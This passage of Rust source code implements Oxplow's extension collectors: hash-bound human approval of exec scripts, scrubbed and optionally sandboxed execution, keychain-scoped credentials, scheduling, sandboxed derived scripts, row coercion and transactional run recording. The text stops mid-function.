//! Running collectors (P7.B3): consent, exec, coercion, storage, the
//! run's record.
//!
//! An `exec` collector is a program an extension ships. It runs only
//! after a human approved that exact entry script (by content hash);
//! approvals live in this machine's `exec_consent::ApprovalStore`, outside
//! the repo, so each person consents on their own machine and again
//! whenever the script changes. The entry runs with a scrubbed
//! environment (PATH, HOME, the declared `env` names, its declared
//! `credentials` from the keychain, OXPLOW_* context) and must print `{"entities": {"<name>": [ {col: value, …}, … ]}}`.
//!
//! A `starlark` / `jaq` collector is *derived*: its script gets the rows of
//! its read-only SQL `input` as `{"rows": [...]}` and returns the same
//! shape, in the collector sandbox (no files, network, env or secrets), so
//! it needs no approval.
//!
//! With `sync: upsert` the output may also carry
//! `"deleted": {"<name>": [key, …]}`; rows update by key and an entity the
//! run doesn't mention is left alone.
//!
//! A run commits its rows, its `collector_run` row and its
//! `collector.synced@1` event in one transaction; a failed run records
//! the failure the same way. See `.context/semantic-layer.md` →
//! "Collectors".

use oxplow_domain::vocabulary::VocabularyHandle;
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;

use oxplow_ai::secrets::SecretStore;
use oxplow_config::collectors::{
    CollectorRuntime, CollectorSpec, CollectorSync, ColumnType, EntityDecl, Trigger,
};
use oxplow_db::{
    CollectorRun, EntityTable, EntityWrite, SqlCell, SqliteCollectorStore, StoredType,
};
use oxplow_domain::events::schema::{CollectorSynced, CollectorSyncedV1};
use oxplow_domain::{DomainError, Envelope, StoredEvent};
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};

/// How long a collector may run.
pub const COLLECTOR_TIMEOUT: Duration = Duration::from_secs(120);
/// Largest stdout a collector may produce.
pub const MAX_OUTPUT_BYTES: usize = 64 * 1024 * 1024;
/// Local (gitignored) consent file under `.oxplow/` (see `exec_consent`).
pub use crate::exec_consent::LEGACY_APPROVALS_FILE;

/// Outcome of one run, as reported to the UI / agent.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct CollectorRunReport {
    pub owner: String,
    pub id: String,
    /// An entity collector's rows per entity after the run.
    pub row_counts: BTreeMap<String, i64>,
    /// A fact collector's facts recorded.
    pub facts: i64,
}

/// A declared collector with its last run and consent status.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct CollectorListing {
    /// The extension that declares it.
    pub owner: String,
    pub spec: CollectorSpec,
    pub run: Option<CollectorRun>,
    /// This machine approved the entry script (and its `network` list) as
    /// it is now.
    pub approved: bool,
    /// Whether this OS enforces the collector's `network` list.
    pub network_enforced: bool,
    /// Each declared credential and whether it has a value (never the value).
    pub credentials: Vec<CredentialStatus>,
    /// Its approval hash as it is now: the person's Approve & Run sends
    /// back the version they reviewed (tsk349). `None` for derived
    /// collectors and unreadable entries.
    pub version: Option<String>,
    /// Why failures disabled it on this machine, when they did (P7.C2).
    pub disabled: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct CredentialStatus {
    pub name: String,
    pub set: bool,
}

/// Where collectors live and what running them needs.
pub struct Collectors<'a> {
    /// The worktree whose `oxplow/extensions/` declares them.
    pub root: &'a Path,
    /// This project's key ([`project_key`]): credentials are scoped by it.
    pub project: String,
    /// This machine's approvals (outside the repo, see `exec_consent`).
    pub approvals: &'a crate::exec_consent::ApprovalStore,
    pub store: &'a SqliteCollectorStore,
    /// What a run commits its rows, run state and event through.
    pub db: oxplow_db::Database,
    pub vocabulary: VocabularyHandle,
    /// Where credential values are kept (the OS keychain in the app).
    pub secrets: &'a dyn SecretStore,
    /// What a derived collector's `input` is read through.
    pub layer: crate::sql_gateway::SqlGateway,
    /// The loaded-extensions cache (`Services.extension_catalog`).
    pub catalog: &'a crate::extension_catalog::ExtensionCatalog,
    /// What a derived collector's `ai_*` builtins ask (recorded computations).
    pub ai: std::sync::Arc<crate::ai_compute::AiCompute>,
}

impl<'a> Collectors<'a> {
    pub fn of(svc: &'a crate::Services, root: &'a Path) -> Self {
        Collectors {
            root,
            project: project_key(&svc.layout.project_dir),
            approvals: &svc.approvals,
            store: &svc.collector_store,
            db: svc.db.clone(),
            vocabulary: svc.event_log_store.vocabulary().clone(),
            secrets: svc.secrets.as_ref(),
            layer: svc.sql.clone(),
            catalog: &svc.extension_catalog,
            ai: svc.ai_compute.clone(),
        }
    }
}

/// A short stable key for a project (its canonical path, hashed): what
/// credentials are scoped by, so a same-named extension in another repo
/// can't read this one's (tsk348). Every worktree of the project shares it.
pub fn project_key(project_dir: &Path) -> String {
    use sha2::{Digest, Sha256};
    let canon = project_dir
        .canonicalize()
        .unwrap_or_else(|_| project_dir.to_path_buf());
    hex::encode(Sha256::digest(canon.to_string_lossy().as_bytes()))[..16].to_string()
}

/// Keychain account for an extension's credential. Scoped by project and
/// extension, so neither another repo nor another extension can read it by
/// declaring the same name.
/// The keychain account of a provider instance's credential `name`: an
/// instance's own, so two instances of one provider (two workspaces) hold
/// two keys. `scope` is the project's key for a project's instance, or
/// `global` for the person's (one value for every project).
pub fn instance_credential_account(
    scope: &str,
    extension: &str,
    instance_id: &str,
    name: &str,
) -> String {
    format!("instance:{scope}:{extension}/{instance_id}:{name}")
}

pub fn credential_account(project: &str, extension: &str, name: &str) -> String {
    format!("source:{project}:{extension}:{name}")
}

/// Set (or with `None`, clear) a credential some collector of `extension`
/// declares (a provider's are its instances':
/// `ProviderRegistry::set_credential`). For the person, from the UI;
/// agents can't reach this.
pub fn set_credential(
    ctx: &Collectors<'_>,
    extension: &str,
    name: &str,
    value: Option<&str>,
) -> Result<(), DomainError> {
    let ext = ctx
        .catalog
        .get(ctx.root)
        .iter()
        .find(|e| e.name == extension)
        .cloned()
        .ok_or(DomainError::NotFound)?;
    let declared = ext
        .collectors
        .iter()
        .flat_map(|s| s.credentials.iter())
        .any(|c| c == name);
    if !declared {
        return Err(DomainError::Invalid(format!(
            "no collector in `{extension}` declares a credential named `{name}`"
        )));
    }
    let account = credential_account(&ctx.project, extension, name);
    let result = match value.map(str::trim).filter(|v| !v.is_empty()) {
        Some(v) => ctx.secrets.set(&account, v),
        None => ctx.secrets.delete(&account),
    };
    result.map_err(|e| DomainError::Storage(e.to_string()))
}

/// Every declared collector under `root`, with its last run and consent.
pub async fn list_collectors(ctx: &Collectors<'_>) -> Result<Vec<CollectorListing>, DomainError> {
    let runs = ctx.store.list_runs().await?;
    let health = crate::plugin_health::PluginHealth::new(ctx.db.clone(), ctx.vocabulary.clone());
    let mut out = Vec::new();
    for ext in ctx.catalog.get(ctx.root).iter().cloned() {
        let ext_dir = ctx.root.join(&ext.path);
        for spec in ext.collectors {
            // A derived collector can't do anything an approval would guard.
            let version = (!spec.runtime.is_derived())
                .then(|| approval_hash(&ext_dir, &spec).ok())
                .flatten();
            let approved = spec.runtime.is_derived()
                || version
                    .as_ref()
                    .is_some_and(|h| is_approved(ctx.approvals, &ext.name, &spec.id, h));
            let run = runs
                .iter()
                .find(|r| r.owner == ext.name && r.id == spec.id)
                .cloned();
            let credentials = spec
                .credentials
                .iter()
                .map(|name| CredentialStatus {
                    name: name.clone(),
                    set: ctx
                        .secrets
                        .get(&credential_account(&ctx.project, &ext.name, name))
                        .ok()
                        .flatten()
                        .is_some(),
                })
                .collect();
            let disabled = health
                .disabled_reason(&plugin_key(&ext.name, &spec.id))
                .await?;
            out.push(CollectorListing {
                owner: ext.name.clone(),
                disabled,
                spec,
                run,
                approved,
                network_enforced: crate::net_sandbox::enforced(),
                credentials,
                version,
            });
        }
    }
    Ok(out)
}

/// Collectors the scheduler should run now: approved, not disabled
/// `every` collectors that never ran or last ran at least their interval
/// before `now_ms`.
pub fn due_collectors(listings: &[CollectorListing], now_ms: i64) -> Vec<(String, String)> {
    listings
        .iter()
        .filter(|l| {
            scheduled_every_ms(l)
                .is_some_and(|every| last_run_ms(l).is_none_or(|last| now_ms - last >= every))
        })
        .map(|l| (l.owner.clone(), l.spec.id.clone()))
        .collect()
}

/// Its interval, when the schedule runs it: approved, not disabled,
/// `every:`.
fn scheduled_every_ms(l: &CollectorListing) -> Option<i64> {
    match l.spec.trigger {
        Trigger::Every { minutes } if l.approved && l.disabled.is_none() => {
            Some(i64::from(minutes) * 60_000)
        }
        _ => None,
    }
}

fn last_run_ms(l: &CollectorListing) -> Option<i64> {
    l.run.as_ref().and_then(|s| {
        oxplow_domain::Timestamp::parse(&s.last_run_at)
            .ok()
            .map(|t| t.unix_ms())
    })
}

/// Run every due collector (see [`due_collectors`]) from the primary
/// worktree, each as the `collector.sync` command run by the system — so a
/// scheduled run is audited and logs `command.executed` like one from the
/// UI, a lens action or MCP. Unapproved collectors never run here: the
/// command refuses them. Returns what it ran; a failed run
/// is logged and the rest still run.
pub async fn run_due_collectors(state: &crate::Services) -> Vec<(String, String)> {
    let root = state.worktrees.resolve(None).await;
    let Ok(listings) = list_collectors(&Collectors::of(state, &root)).await else {
        return vec![];
    };
    let now = oxplow_domain::Timestamp::now().unix_ms();
    let due = due_collectors(&listings, now);
    // When each is next due, so one that misses its run reads unfresh.
    let plans = listings
        .iter()
        .map(|l| {
            let due = scheduled_every_ms(l)
                .map(|every| crate::plugin_health::next_due_ms(last_run_ms(l), every, now));
            (plugin_key(&l.owner, &l.spec.id), due)
        })
        .collect();
    let health =
        crate::plugin_health::PluginHealth::new(state.db.clone(), state.vocabulary.clone());
    if let Err(e) = health.set_next_due(plans).await {
        tracing::warn!(error = ?e, "recording the collectors' next due times failed");
    }
    for (owner, id) in &due {
        let input = serde_json::json!({ "owner": owner, "id": id });
        if let Err(e) = state
            .commands
            .run(&oxplow_domain::Actor::System, SYNC, input, false)
            .await
        {
            tracing::warn!(%owner, %id, error = ?e, "scheduled collector run failed");
        }
    }
    due
}

/// Background loop: once a minute, [`run_due_collectors`].
pub fn spawn_scheduler(state: std::sync::Arc<crate::Services>) {
    tokio::spawn(async move {
        // Stay out of boot's way.
        tokio::time::sleep(Duration::from_secs(30)).await;
        loop {
            run_due_collectors(&state).await;
            tokio::time::sleep(Duration::from_secs(60)).await;
        }
    });
}

/// SHA-256 of the entry script: what an approval is bound to.
pub fn entry_hash(ext_dir: &Path, entry: &str) -> std::io::Result<String> {
    use sha2::{Digest, Sha256};
    let bytes = std::fs::read(ext_dir.join(entry))?;
    Ok(hex::encode(Sha256::digest(&bytes)))
}

/// What an approval covers: every file in the extension (the entry and
/// any helper it runs, tsk347) and the hosts it may reach (tsk324), so a
/// changed helper or a widened `network` needs approving again.
///
/// The manifest and lenses aren't code the collector runs, so editing a
/// lens doesn't ask again; what the manifest grants it (its entry,
/// env passthrough, credentials and network, tsk348) is hashed from the
/// spec instead.
pub fn approval_hash(ext_dir: &Path, spec: &CollectorSpec) -> std::io::Result<String> {
    use sha2::{Digest, Sha256};
    // The entry must exist; the tree hash alone wouldn't notice a typo.
    let entry = entry_of(spec);
    entry_hash(ext_dir, entry)?;
    let tree = crate::exec_consent::tree_hash_except(ext_dir, &|rel| {
        rel == Path::new("extension.yaml") || rel.starts_with("lenses")
    })?;
    let sorted = |v: &[String]| {
        let mut v = v.to_vec();
        v.sort();
        v.join(",")
    };
    let text = format!(
        "tree:{tree}\nentry:{}\nenv:{}\ncredentials:{}\nnetwork:{}",
        entry,
        sorted(&spec.env),
        sorted(&spec.credentials),
        sorted(&spec.network)
    );
    Ok(hex::encode(Sha256::digest(text.as_bytes())))
}

/// A program or script collector's entry (`parse_collectors` requires one
/// for every runtime but `read`, which never gets here).
fn entry_of(spec: &CollectorSpec) -> &str {
    spec.entry.as_deref().unwrap_or_default()
}

/// How an exec collector may reach the network.
#[derive(Debug, Clone)]
pub enum Egress {
    /// Unrestricted: an OS without enforcement, and tests of exec itself.
    Open,
    /// Under `sandbox-exec`, out only through the egress proxy these
    /// variables point at (see `net_sandbox`).
    Sandboxed { proxy_env: Vec<(String, String)> },
}

/// Whether `owner/id` is approved for this exact entry hash.
pub fn is_approved(
    approvals: &crate::exec_consent::ApprovalStore,
    owner: &str,
    id: &str,
    hash: &str,
) -> bool {
    approvals.is_approved(&format!("{owner}/{id}"), hash)
}

/// Record a human's approval of `owner/id` at `hash`.
pub fn approve(
    approvals: &crate::exec_consent::ApprovalStore,
    owner: &str,
    id: &str,
    hash: &str,
) -> std::io::Result<()> {
    approvals.approve(&format!("{owner}/{id}"), hash)
}

/// What a collector run returns: rows per entity, and (with `sync: upsert`)
/// the keys to remove per entity.
#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ScriptOutput {
    pub entities: BTreeMap<String, Vec<serde_json::Value>>,
    #[serde(default)]
    pub deleted: BTreeMap<String, Vec<serde_json::Value>>,
    /// Events of its extension's own declared types to log with the run
    /// (P9.D2): an observation worth reacting to ("a pull request
    /// merged"), not a way to act — see [`plan_events`].
    #[serde(default)]
    pub events: Vec<crate::extension_commands::ComposedEvent>,
}

impl ScriptOutput {
    /// Parse and check against the declaration: only declared entities,
    /// and tombstones only for an upsert collector.
    fn parse(spec: &CollectorSpec, value: serde_json::Value) -> Result<Self, String> {
        let out: ScriptOutput = serde_json::from_value(value).map_err(|e| {
            format!(
                "collector `{}` must return JSON like {{\"entities\": {{\"<name>\": [...]}}}}: {e}",
                spec.id
            )
        })?;
        if let Some(unknown) = out
            .entities
            .keys()
            .chain(out.deleted.keys())
            .find(|k| !spec.entities.iter().any(|e| &e.name == *k))
        {
            return Err(format!(
                "collector `{}` returned undeclared entity `{unknown}`",
                spec.id
            ));
        }
        if !out.deleted.is_empty() && spec.sync != CollectorSync::Upsert {
            return Err(format!(
                "collector `{}` returned `deleted`, which needs `sync: upsert`",
                spec.id
            ));
        }
        Ok(out)
    }
}

/// Run the entry and return its raw rows per entity.
pub fn exec_collector(
    ext_dir: &Path,
    spec: &CollectorSpec,
    host_env: &dyn Fn(&str) -> Option<String>,
    credentials: &BTreeMap<String, String>,
    timeout: Duration,
    egress: &Egress,
) -> Result<ScriptOutput, String> {
    use std::io::Read;
    use std::process::{Command, Stdio};

    let entry = ext_dir.join(entry_of(spec));
    if !entry.is_file() {
        return Err(format!(
            "entry `{}` doesn't exist in the extension folder",
            entry_of(spec)
        ));
    }
    let mut cmd = match egress {
        Egress::Open => Command::new(&entry),
        Egress::Sandboxed { .. } => {
            let mut c = Command::new(crate::net_sandbox::SANDBOX_EXEC);
            c.arg("-p").arg(crate::net_sandbox::PROFILE).arg(&entry);
            c
        }
    };
    cmd.current_dir(ext_dir)
        .env_clear()
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .env("OXPLOW_EXTENSION_DIR", ext_dir)
        .env("OXPLOW_COLLECTOR_ID", &spec.id);
    for name in ["PATH", "HOME"] {
        if let Some(v) = host_env(name) {
            cmd.env(name, v);
        }
    }
    for name in &spec.env {
        if let Some(v) = host_env(name) {
            cmd.env(name, v);
        }
    }
    for (name, value) in credentials {
        cmd.env(name, value);
    }
    if let Egress::Sandboxed { proxy_env } = egress {
        for (name, value) in proxy_env {
            cmd.env(name, value);
        }
    }
    let mut child = cmd
        .spawn()
        .map_err(|e| format!("couldn't start `{}`: {e}", entry_of(spec)))?;

    // Drain both pipes on threads so a chatty program can't deadlock.
    let mut out_pipe = child.stdout.take().ok_or("no stdout")?;
    let mut err_pipe = child.stderr.take().ok_or("no stderr")?;
    let out_thread = std::thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = out_pipe
            .by_ref()
            .take(MAX_OUTPUT_BYTES as u64 + 1)
            .read_to_end(&mut buf);
        buf
    });
    let err_thread = std::thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = err_pipe.by_ref().take(64 * 1024).read_to_end(&mut buf);
        buf
    });

    let started = std::time::Instant::now();
    let status = loop {
        match child.try_wait().map_err(|e| e.to_string())? {
            Some(status) => break status,
            None if started.elapsed() >= timeout => {
                let _ = child.kill();
                let _ = child.wait();
                return Err(format!(
                    "collector `{}` timed out after {timeout:?}",
                    spec.id
                ));
            }
            None => std::thread::sleep(Duration::from_millis(25)),
        }
    };
    let stdout = out_thread.join().unwrap_or_default();
    let stderr = String::from_utf8_lossy(&err_thread.join().unwrap_or_default())
        .trim()
        .to_string();
    if !status.success() {
        return Err(format!(
            "collector `{}` failed ({status}, exit code {:?}): {stderr}",
            spec.id,
            status.code()
        ));
    }
    if stdout.len() > MAX_OUTPUT_BYTES {
        return Err(format!(
            "collector `{}` printed more than {MAX_OUTPUT_BYTES} bytes",
            spec.id
        ));
    }
    let value: serde_json::Value = serde_json::from_slice(&stdout).map_err(|e| {
        format!(
            "collector `{}` must print JSON like {{\"entities\": {{\"<name>\": [...]}}}}: {e}",
            spec.id
        )
    })?;
    ScriptOutput::parse(spec, value)
}

/// A model call refused: a review runs no model (P8.C4) — the `ai_*`
/// builtins answer with this error, so a review never spends or sends.
pub struct RefusingOracle;

const REFUSED: &str = "a review runs no model: `ai_*` calls are refused";

impl oxplow_collect_plugin::AiOracle for RefusingOracle {
    fn classify(&self, _: &str, _: &[String]) -> Result<serde_json::Value, String> {
        Err(REFUSED.into())
    }
    fn score(&self, _: &str, _: &[String]) -> Result<serde_json::Value, String> {
        Err(REFUSED.into())
    }
    fn summarize(&self, _: &str, _: Option<&str>) -> Result<String, String> {
        Err(REFUSED.into())
    }
    fn extract(
        &self,
        _: &str,
        _: &str,
        _: &serde_json::Value,
    ) -> Result<serde_json::Value, String> {
        Err(REFUSED.into())
    }
}

/// What a review's dry run of a collector gave (P8.C4).
#[derive(Debug, Clone, PartialEq)]
pub enum DryRun {
    Output(ScriptOutput),
    Failed(String),
    /// It runs a program or reads a provider: a review never does, approved
    /// or not.
    NotRun(String),
}

/// Run collector `spec` — `script` being its entry's text in the version
/// under review — on `event` / `rows`, storing nothing and asking no model,
/// within the command scripts' budget (a review waits on it, so a runaway
/// script is given up on in seconds, not a collector's two minutes).
/// Only a derived collector (Starlark, jaq) runs; an exec or read one is
/// [`DryRun::NotRun`] and nothing is spawned.
pub async fn dry_run_collector(
    layer: &crate::sql_gateway::SqlGateway,
    spec: &CollectorSpec,
    script: Option<String>,
    event: Option<&StoredEvent>,
    rows: Option<Vec<serde_json::Value>>,
) -> DryRun {
    if !spec.runtime.is_derived() {
        return DryRun::NotRun(match spec.runtime {
            CollectorRuntime::Read => "it reads a provider, which a review never does".into(),
            _ => "it runs a program, which a review never does, approved or not".into(),
        });
    }
    let Some(script) = script else {
        return DryRun::Failed(format!("entry `{}` doesn't exist", entry_of(spec)));
    };
    match derive_collector(
        layer,
        script,
        spec,
        std::sync::Arc::new(RefusingOracle),
        event,
        rows,
        crate::extension_commands::COMMAND_SCRIPT_BUDGET,
    )
    .await
    {
        Ok(out) => DryRun::Output(out),
        Err(e) => DryRun::Failed(e),
    }
}

/// Run a derived (starlark / jaq) collector: read its `input` rows (the
/// trigger event's anchors bound by name) — or take `rows`, standing in
/// for them (an example's fixture) — then run its script over
/// `{"rows": [...], "event"?: {...}}` in the collector sandbox, within
/// `budget`.
pub async fn derive_collector(
    layer: &crate::sql_gateway::SqlGateway,
    script: String,
    spec: &CollectorSpec,
    oracle: std::sync::Arc<dyn oxplow_collect_plugin::AiOracle>,
    event: Option<&StoredEvent>,
    rows: Option<Vec<serde_json::Value>>,
    budget: oxplow_collect_plugin::SandboxBudget,
) -> Result<ScriptOutput, String> {
    let rows = match (rows, &spec.input) {
        (Some(rows), _) => rows,
        (None, None) => Vec::new(),
        (None, Some(sql)) => {
            input_rows(
                layer,
                &spec.id,
                sql,
                anchor_params(event, Anchored::default()),
            )
            .await?
        }
    };
    let mut input = serde_json::json!({ "rows": rows });
    if let Some(e) = event {
        input["event"] = event_input(e);
    }
    let runtime = spec.runtime;
    let value = tokio::task::spawn_blocking(move || {
        use oxplow_collect_plugin::runtime::{
            run_jaq, run_sandboxed_excluding, run_starlark_with_ai,
        };
        // The time its `ai_*` calls wait on a model isn't the script's.
        let host = std::sync::Arc::new(oxplow_collect_plugin::AiHost::new(oracle));
        let clock = host.clock();
        run_sandboxed_excluding(&budget, &clock, move || match runtime {
            CollectorRuntime::Jaq => run_jaq(&script, &input),
            _ => run_starlark_with_ai(&script, &input, &host),
        })
    })
    .await
    .map_err(|e| format!("collector task panicked: {e}"))?
    .map_err(|e| format!("collector `{}`: {e}", spec.id))?;
    ScriptOutput::parse(spec, value)
}

/// Coerce raw JSON rows to the entity's declared columns (in order).
pub fn coerce_rows(
    entity: &EntityDecl,
    rows: Vec<serde_json::Value>,
) -> Result<Vec<Vec<SqlCell>>, String> {
    use serde_json::Value;
    let mut out = Vec::with_capacity(rows.len());
    for (i, row) in rows.into_iter().enumerate() {
        let Value::Object(obj) = row else {
            return Err(format!(
                "entity `{}` row {i} must be an object",
                entity.name
            ));
        };
        let mut cells = Vec::with_capacity(entity.columns.len());
        for col in &entity.columns {
            let v = obj.get(&col.name).cloned().unwrap_or(Value::Null);
            let bad = || {
                format!(
                    "entity `{}` row {i}: column `{}` expects {:?}, got {v}",
                    entity.name, col.name, col.col_type
                )
            };
            let cell = match (&v, col.col_type) {
                (Value::Null, _) => SqlCell::Null(()),
                (Value::Number(n), ColumnType::Int) => SqlCell::Int(n.as_i64().ok_or_else(bad)?),
                (Value::Number(n), ColumnType::Real) => SqlCell::Real(n.as_f64().ok_or_else(bad)?),
                (Value::Bool(b), ColumnType::Bool) => SqlCell::Int(i64::from(*b)),
                (Value::String(s), ColumnType::Text | ColumnType::Time) => SqlCell::Text(s.clone()),
                _ => return Err(bad()),
            };
            if col.name == entity.key && cell == SqlCell::Null(()) {
                return Err(format!(
                    "entity `{}` row {i}: key `{}` is missing",
                    entity.name, entity.key
                ));
            }
            cells.push(cell);
        }
        out.push(cells);
    }
    Ok(out)
}

pub(crate) fn stored(t: ColumnType) -> StoredType {
    match t {
        ColumnType::Int | ColumnType::Bool => StoredType::Integer,
        ColumnType::Real => StoredType::Real,
        ColumnType::Text | ColumnType::Time => StoredType::Text,
    }
}

/// Why a collector run didn't produce data.
#[derive(Debug)]
pub enum RunCollectorError {
    /// No such owner or collector.
    NotFound,
    /// Nobody on this machine approved the current entry script. Nothing ran.
    NeedsApproval(String),
    /// It ran (or tried to) and failed; recorded as its run.
    Failed(String),
    /// Failures disabled it on this machine (P7.C2) until a person runs
    /// `plugin.enable`. Nothing ran.
    Disabled(String),
    /// Oxplow's own storage failed.
    Storage(DomainError),
}

impl From<RunCollectorError> for DomainError {
    fn from(e: RunCollectorError) -> Self {
        match e {
            RunCollectorError::NotFound => DomainError::NotFound,
            RunCollectorError::NeedsApproval(m)
            | RunCollectorError::Failed(m)
            | RunCollectorError::Disabled(m) => DomainError::Invalid(m),
            RunCollectorError::Storage(e) => e,
        }
    }
}

/// What ran a collector: `collector.sync` by hand, its `every:` schedule,
/// or an event its `on:` names.
#[derive(Debug, Clone)]
pub enum RunTrigger {
    Manual,
    Every,
    On(Arc<StoredEvent>),
}

impl RunTrigger {
    fn name(&self) -> &'static str {
        match self {
            RunTrigger::Manual => "manual",
            RunTrigger::Every => "every",
            RunTrigger::On(_) => "on",
        }
    }

    fn event(&self) -> Option<&StoredEvent> {
        match self {
            RunTrigger::On(e) => Some(e),
            _ => None,
        }
    }
}

/// What a run knows of its context besides its trigger event's anchors
/// (a fact collector's snapshot, say).
#[derive(Debug, Clone, Copy, Default)]
pub struct Anchored {
    pub stream_id: Option<i64>,
    pub snapshot_id: Option<i64>,
    pub effort_id: Option<i64>,
    pub thread_id: Option<i64>,
}

/// The named parameters a collector's `input` may use: the trigger
/// event's anchors (`:stream_id`, `:snapshot_id`, `:effort_id`,
/// `:thread_id`, `:turn_id`), else what the run `known`, and the event's
/// seq (`:event_id`); NULL when neither has one.
pub fn anchor_params(event: Option<&StoredEvent>, known: Anchored) -> Vec<(String, SqlCell)> {
    let a = event.map(|e| &e.envelope.anchors);
    let int = |v: Option<i64>| v.map_or(SqlCell::Null(()), SqlCell::Int);
    vec![
        (
            "stream_id".into(),
            int(a
                .and_then(|a| a.stream_id)
                .map(|v| v.value())
                .or(known.stream_id)),
        ),
        (
            "snapshot_id".into(),
            int(a.and_then(|a| a.snapshot_id).or(known.snapshot_id)),
        ),
        (
            "effort_id".into(),
            int(a
                .and_then(|a| a.effort_id)
                .map(|v| v.value())
                .or(known.effort_id)),
        ),
        (
            "thread_id".into(),
            int(a
                .and_then(|a| a.thread_id)
                .map(|v| v.value())
                .or(known.thread_id)),
        ),
        ("turn_id".into(), int(a.and_then(|a| a.turn_id))),
        ("event_id".into(), int(event.map(|e| e.seq))),
    ]
}

/// A collector's `input` rows: its read-only `sql` with `params` bound, as
/// objects. More than the row limit fails rather than handing over a
/// partial set.
pub async fn input_rows(
    layer: &crate::sql_gateway::SqlGateway,
    id: &str,
    sql: &str,
    params: Vec<(String, SqlCell)>,
) -> Result<Vec<serde_json::Value>, String> {
    let limit = oxplow_db::semantic_layer::MAX_ROW_LIMIT;
    let query = oxplow_db::semantic_layer::SqlQuery::new(sql)
        .named(params)
        .limit(Some(limit));
    let out = layer
        .run(query)
        .await
        .map_err(|e| format!("collector `{id}` input: {e}"))?;
    if out.truncated {
        return Err(format!(
            "collector `{id}` input returned more than {limit} rows; narrow it"
        ));
    }
    Ok(out
        .rows
        .into_iter()
        .map(|r| {
            serde_json::Value::Object(
                out.columns
                    .iter()
                    .cloned()
                    .zip(
                        r.into_iter()
                            .map(|c| serde_json::to_value(c).unwrap_or_default()),
                    )
                    .collect(),
            )
        })
        .collect())
}

/// The trigger event as a script sees it (`input.event`).
pub fn event_input(e: &StoredEvent) -> serde_json::Value {
    serde_json::json!({
        "type": e.envelope.event_type,
        "seq": e.seq,
        "id": e.envelope.id.to_string(),
        "at": e.envelope.at,
        "subject": e.envelope.subject,
        "payload": e.envelope.payload,
        "anchors": e.envelope.anchors,
    })
}

/// A collector's `plugin_health` key: owner / id, kind `collector`.
pub fn plugin_key(owner: &str, id: &str) -> oxplow_db::PluginKey {
    oxplow_db::PluginKey {
        plugin: owner.to_string(),
        contribution: id.to_string(),
        kind: "collector",
    }
}

/// Run one collector end to end, under the plugin failure policy
/// (P7.C2, [`crate::plugin_health`]): a disabled one doesn't run (its
/// reason as [`RunCollectorError::Disabled`]); a failed run counts — the
/// third in a row disables it — and a good one starts the count over.
pub async fn run_collector(
    ctx: &Collectors<'_>,
    owner: &str,
    id: &str,
    trigger: RunTrigger,
    source: &str,
) -> Result<CollectorRunReport, RunCollectorError> {
    let health = crate::plugin_health::PluginHealth::new(ctx.db.clone(), ctx.vocabulary.clone());
    let key = plugin_key(owner, id);
    if let Some(reason) = health
        .disabled_reason(&key)
        .await
        .map_err(RunCollectorError::Storage)?
    {
        return Err(RunCollectorError::Disabled(format!(
            "collector `{owner}/{id}` is disabled: {reason}. A person can enable it again \
             (`plugin.enable`, Settings → Extensions)."
        )));
    }
    let started = std::time::Instant::now();
    let result = run_collector_once(ctx, owner, id, trigger, source).await;
    let recorded = match &result {
        Ok(_) => health.succeeded(&key, Some(started.elapsed())).await,
        Err(RunCollectorError::Failed(error)) => health.failed(&key, error).await.map(|_| ()),
        Err(_) => Ok(()),
    };
    if let Err(e) = recorded {
        tracing::warn!(collector = %format!("{owner}/{id}"), error = %e, "recording its health failed");
    }
    result
}

/// [`run_collector`]'s run: consent check, run, coercion, then one
/// transaction with its rows, its `collector_run` row and its
/// `collector.synced@1` event (logged as `source`). A run that fails after
/// the consent check is recorded the same way, without rows, so the UI
/// can show it.
async fn run_collector_once(
    ctx: &Collectors<'_>,
    owner: &str,
    id: &str,
    trigger: RunTrigger,
    source: &str,
) -> Result<CollectorRunReport, RunCollectorError> {
    let started = std::time::Instant::now();
    let (spec, output) = produce(ctx, owner, id, trigger.event(), None).await?;
    // What it may not emit fails the run whole: nothing is stored.
    let writes = output.and_then(|mut o| {
        let events = plan_events(
            &ctx.vocabulary.current(),
            owner,
            &spec,
            std::mem::take(&mut o.events),
        )?;
        Ok((plan_writes(owner, &spec, o)?, events))
    });
    let last_event_id = trigger.event().map(|e| e.seq);
    let run = |status: &str, error: Option<String>| CollectorRun {
        owner: owner.to_string(),
        id: id.to_string(),
        status: status.into(),
        last_run_at: now_rfc3339(),
        error,
        row_counts: BTreeMap::new(),
        cursor: None,
        last_event_id,
    };
    let collector = oxplow_domain::refs::build::collector_ref(owner, id);
    let event = Synced {
        source: source.to_string(),
        cause: trigger.event().map(|e| (e.envelope.id.clone(), e.seq)),
        collector,
        trigger: trigger.name(),
    };
    let error = match writes {
        Ok((writes, events)) => {
            let names: Vec<String> = writes.iter().map(|(t, _)| t.entity.clone()).collect();
            let ok_run = run("ok", None);
            let vocabulary = ctx.vocabulary.clone();
            let event = event.clone();
            let elapsed = elapsed_ms(started);
            let committed = ctx
                .db
                .transaction(move |tx| {
                    let counts: BTreeMap<String, i64> = names
                        .iter()
                        .cloned()
                        .zip(oxplow_db::collector_store::write_rows_tx(tx, &writes)?)
                        .collect();
                    let run = CollectorRun {
                        row_counts: counts.clone(),
                        ..ok_run.clone()
                    };
                    oxplow_db::collector_store::record_run_in(tx, &run)
                        .map_err(oxplow_db::map_sql_err)?;
                    let vocabulary = vocabulary.current();
                    let synced = event.envelope("ok", counts.clone(), 0, elapsed, None);
                    oxplow_db::event_log_store::append_tx(tx, &vocabulary, &synced)?;
                    // What it observed, caused by this run: with its rows
                    // or not at all.
                    for emitted in &events {
                        oxplow_db::event_log_store::append_tx(
                            tx,
                            &vocabulary,
                            &emitted.clone().with_cause(synced.id.clone()),
                        )?;
                    }
                    Ok(counts)
                })
                .await;
            match committed {
                Ok(row_counts) => {
                    return Ok(CollectorRunReport {
                        owner: owner.to_string(),
